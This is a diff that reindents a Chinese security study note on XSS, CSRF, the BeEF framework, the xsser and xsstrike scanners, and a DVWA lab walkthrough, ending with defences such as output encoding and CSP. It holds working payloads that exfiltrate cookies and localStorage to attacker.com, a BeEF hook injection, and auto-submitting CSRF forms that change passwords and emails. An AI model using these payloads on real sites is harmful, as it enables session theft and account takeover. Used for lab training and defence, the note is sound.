@@ -2,19 +2,19 @@
 
 ## 目录
 - [[#一、XSS跨站脚本攻击原理|一、XSS跨站脚本攻击原理]]
-  - [[#1.1 XSS三种类型|1.1 XSS三种类型]]
-  - [[#1.2 XSS利用向量|1.2 XSS利用向量（Payload）]]
+ - [[#1.1 XSS三种类型|1.1 XSS三种类型]]
+ - [[#1.2 XSS利用向量|1.2 XSS利用向量（Payload）]]
 - [[#二、beef浏览器利用框架|二、beef浏览器利用框架]]
-  - [[#2.1 启动与控制面板|2.1 启动与控制面板]]
-  - [[#2.2 攻击模块使用|2.2 攻击模块使用]]
-  - [[#2.3 Hook注入方法|2.3 Hook注入方法]]
+ - [[#2.1 启动与控制面板|2.1 启动与控制面板]]
+ - [[#2.2 攻击模块使用|2.2 攻击模块使用]]
+ - [[#2.3 Hook注入方法|2.3 Hook注入方法]]
 - [[#三、xsser自动化扫描|三、xsser自动化扫描]]
 - [[#四、xsstrike高级XSS检测|四、xsstrike高级XSS检测]]
 - [[#五、CSRF跨站请求伪造|五、CSRF跨站请求伪造]]
-  - [[#5.1 攻击原理|5.1 攻击原理]]
-  - [[#5.2 CSRF Payload示例|5.2 CSRF Payload示例]]
-  - [[#5.3 csrftester检测|5.3 csrftester检测]]
-  - [[#5.4 CSRF防御与绕过|5.4 CSRF防御与绕过]]
+ - [[#5.1 攻击原理|5.1 攻击原理]]
+ - [[#5.2 CSRF Payload示例|5.2 CSRF Payload示例]]
+ - [[#5.3 csrftester检测|5.3 csrftester检测]]
+ - [[#5.4 CSRF防御与绕过|5.4 CSRF防御与绕过]]
 - [[#六、DVWA XSS + BeEF实战|六、DVWA XSS + BeEF实战]]
 - [[#七、XSS防御与修复|七、XSS防御与修复]]
 
@@ -26,23 +26,23 @@
 
 ```mermaid
 flowchart TD
-    subgraph 反射型XSS
-        R1[攻击者构造恶意链接] --> R2[诱导受害者点击]
-        R2 --> R3[服务器反射恶意脚本在响应中]
-        R3 --> R4[浏览器执行恶意脚本]
-    end
-    subgraph 存储型XSS
-        S1[攻击者提交恶意脚本] --> S2[服务器存入数据库]
-        S2 --> S3[其他用户访问页面]
-        S3 --> S4[服务器返回恶意脚本]
-        S4 --> S5[浏览器执行恶意脚本]
-    end
-    subgraph DOM型XSS
-        D1[攻击者构造恶意URL] --> D2[诱导受害者访问]
-        D2 --> D3[客户端JS读取URL参数]
-        D3 --> D4[通过DOM操作写入页面]
-        D4 --> D5[浏览器执行恶意脚本]
-    end
+ subgraph 反射型XSS
+ R1[攻击者构造恶意链接] --> R2[诱导受害者点击]
+ R2 --> R3[服务器反射恶意脚本在响应中]
+ R3 --> R4[浏览器执行恶意脚本]
+ end
+ subgraph 存储型XSS
+ S1[攻击者提交恶意脚本] --> S2[服务器存入数据库]
+ S2 --> S3[其他用户访问页面]
+ S3 --> S4[服务器返回恶意脚本]
+ S4 --> S5[浏览器执行恶意脚本]
+ end
+ subgraph DOM型XSS
+ D1[攻击者构造恶意URL] --> D2[诱导受害者访问]
+ D2 --> D3[客户端JS读取URL参数]
+ D3 --> D4[通过DOM操作写入页面]
+ D4 --> D5[浏览器执行恶意脚本]
+ end
 ```
 
 **XSS的危害（攻击者视角）：**
@@ -128,7 +128,7 @@ img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
 ```html
 <script>
 new Image().src = "http://attacker.com/log?" +
-  encodeURIComponent(JSON.stringify(localStorage));
+ encodeURIComponent(JSON.stringify(localStorage));
 </script>
 ```
 
@@ -160,7 +160,7 @@ sudo beef-xss
 
 # 启动输出示例:
 # [*] Hook URL: http://<IP>:3000/hook.js
-# [*] UI URL:   http://<IP>:3000/ui/panel
+# [*] UI URL: http://<IP>:3000/ui/panel
 
 # 访问控制面板
 # Firefox → http://localhost:3000/ui/panel
@@ -229,7 +229,7 @@ xsser --url "http://example.com/page.php" -p "search"
 
 # POST请求测试
 xsser --url "http://example.com/login.php" \
-      -p "username" --data="password=test"
+ -p "username" --data="password=test"
 
 # 代理 / Cookie / UA
 xsser --url "http://example.com/" --proxy "http://127.0.0.1:8080"
@@ -237,13 +237,13 @@ xsser --url "http://example.com/" --cookie="PHPSESSID=abc123"
 xsser --url "http://example.com/" --user-agent="Custom/1.0"
 
 # 选择攻击向量
-xsser --url "URL" --auto --Xss             # XSS存储
-xsser --url "URL" --auto --Xsr             # XSS反射
+xsser --url "URL" --auto --Xss # XSS存储
+xsser --url "URL" --auto --Xsr # XSS反射
 
 # 编码绕过
-xsser --url "URL" --auto --Hex             # Hex编码
-xsser --url "URL" --auto --Str             # 字符串编码
-xsser --url "URL" --auto --Une             # Unicode编码
+xsser --url "URL" --auto --Hex # Hex编码
+xsser --url "URL" --auto --Str # 字符串编码
+xsser --url "URL" --auto --Une # Unicode编码
 
 # 设置输出 / DropCookie确认
 xsser --url "URL" --auto --output report
@@ -274,7 +274,7 @@ xsstrike -u "http://example.com" --crawl
 
 # 携带Cookie
 xsstrike -u "http://example.com/page.php?param=test" \
-         --headers "Cookie: PHPSESSID=abc123"
+ --headers "Cookie: PHPSESSID=abc123"
 
 # 盲XSS
 xsstrike -u "URL" --blind http://your-callback-server.com
@@ -292,16 +292,16 @@ CSRF（Cross-Site Request Forgery）利用已认证用户的身份，在用户�
 
 ```mermaid
 sequenceDiagram
-    participant V as 受害者浏览器
-    participant B as bank.com
-    participant A as attacker.com
+ participant V as 受害者浏览器
+ participant B as bank.com
+ participant A as attacker.com
 
-    V->>B: 1. 登录bank.com（获取认证Cookie）
-    V->>A: 2. 访问attacker.com
-    A->>V: 3. 返回页面含恶意请求
-    V->>B: 4. 自动向bank.com发送请求<br/>携带认证Cookie
-    B->>V: 5. 请求成功执行
-    Note over V,B: 转账/修改密码/etc 完成！
+ V->>B: 1. 登录bank.com（获取认证Cookie）
+ V->>A: 2. 访问attacker.com
+ A->>V: 3. 返回页面含恶意请求
+ V->>B: 4. 自动向bank.com发送请求<br/>携带认证Cookie
+ B->>V: 5. 请求成功执行
+ Note over V,B: 转账/修改密码/etc 完成！
 ```
 
 **攻击条件：** 用户在目标网站A已登录（有效Cookie）；用户访问了恶意网站B；网站B包含指向A的请求；浏览器自动携带A的Cookie；请求成功执行。
@@ -318,12 +318,12 @@ sequenceDiagram
 ```html
 <html>
 <body>
-  <form action="http://target.com/change_password.php"
-        method="POST" id="csrf_form">
-    <input type="hidden" name="new_password" value="hacked123">
-    <input type="hidden" name="confirm_password" value="hacked123">
-  </form>
-  <script>document.getElementById('csrf_form').submit();</script>
+ <form action="http://target.com/change_password.php"
+ method="POST" id="csrf_form">
+ <input type="hidden" name="new_password" value="hacked123">
+ <input type="hidden" name="confirm_password" value="hacked123">
+ </form>
+ <script>document.getElementById('csrf_form').submit();</script>
 </body>
 </html>
 ```
@@ -332,10 +332,10 @@ sequenceDiagram
 ```html
 <script>
 fetch('http://target.com/api/update_profile', {
-  method: 'PUT',
-  credentials: 'include',
-  headers: {'Content-Type': 'application/json'},
-  body: JSON.stringify({email: 'attacker@evil.com'})
+ method: 'PUT',
+ credentials: 'include',
+ headers: {'Content-Type': 'application/json'},
+ body: JSON.stringify({email: 'attacker@evil.com'})
 });
 </script>
 ```
@@ -375,16 +375,16 @@ csrftester -u http://example.com/change_password.php
 
 ```mermaid
 flowchart TD
-    B[启动BeEF: sudo beef-xss] --> P[打开BeEF面板<br/>localhost:3000/ui/panel]
-    P --> D[访问DVWA XSS Reflected]
-    D --> T[测试: &lt;script&gt;alert(1)&lt;/script&gt;]
-    T --> H["注入Hook:<br/>&lt;script src='http://IP:3000/hook.js'&gt;&lt;/script&gt;"]
-    H --> Z[BeEF面板出现新Zombie]
-    Z --> M1[获取Cookie]
-    Z --> M2[获取页面HTML]
-    Z --> M3[网络扫描: Detect Internal IP]
-    Z --> M4[社工: Pretty Theft]
-    Z --> S[存储型XSS: 留言板注入Hook]
+ B[启动BeEF: sudo beef-xss] --> P[打开BeEF面板<br/>localhost:3000/ui/panel]
+ P --> D[访问DVWA XSS Reflected]
+ D --> T[测试: &lt;script&gt;alert(1)&lt;/script&gt;]
+ T --> H["注入Hook:<br/>&lt;script src='http://IP:3000/hook.js'&gt;&lt;/script&gt;"]
+ H --> Z[BeEF面板出现新Zombie]
+ Z --> M1[获取Cookie]
+ Z --> M2[获取页面HTML]
+ Z --> M3[网络扫描: Detect Internal IP]
+ Z --> M4[社工: Pretty Theft]
+ Z --> S[存储型XSS: 留言板注入Hook]
 ```
 
 **实战步骤：**
@@ -404,10 +404,10 @@ sudo beef-xss
 
 # Step 6: BeEF面板出现新Zombie → 查看Details
 # Step 7-10: 执行各模块
-#   - Browser → Get Cookie → Execute
-#   - Browser → Get Page HTML → Execute
-#   - Misc → Create Alert Dialog → Execute
-#   - Network → Detect Internal IP → Execute
+# - Browser → Get Cookie → Execute
+# - Browser → Get Page HTML → Execute
+# - Misc → Create Alert Dialog → Execute
+# - Network → Detect Internal IP → Execute
 
 # Step 11: 存储型XSS
 # DVWA → XSS (Stored) → Message输入:
@@ -426,23 +426,23 @@ sudo beef-xss
 **安全开发应对措施：**
 
 1. **输出编码：**
-   ```php
-   htmlspecialchars($input, ENT_QUOTES, 'UTF-8');   // PHP
-   <c:out value="${input}"/>                          // JSP
-   {{ input }}                                        // Django/Angular自动转义
-   ```
+ ```php
+ htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); // PHP
+ <c:out value="${input}"/> // JSP
+ {{ input }} // Django/Angular自动转义
+ ```
 
 2. **内容安全策略（CSP）：**
-   ```
-   Content-Security-Policy: default-src 'self'; script-src 'self'
-   ```
-   阻止内联脚本和外部脚本执行。
+ ```
+ Content-Security-Policy: default-src 'self'; script-src 'self'
+ ```
+ 阻止内联脚本和外部脚本执行。
 
 3. **HttpOnly Cookie：**
-   ```
-   Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
-   ```
-   即使有XSS也无法通过`document.cookie`窃取。
+ ```
+ Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict
+ ```
+ 即使有XSS也无法通过`document.cookie`窃取。
 
 4. 输入验证：白名单验证，拒绝危险标签
 5. `X-XSS-Protection: 1; mode=block`（旧版浏览器）
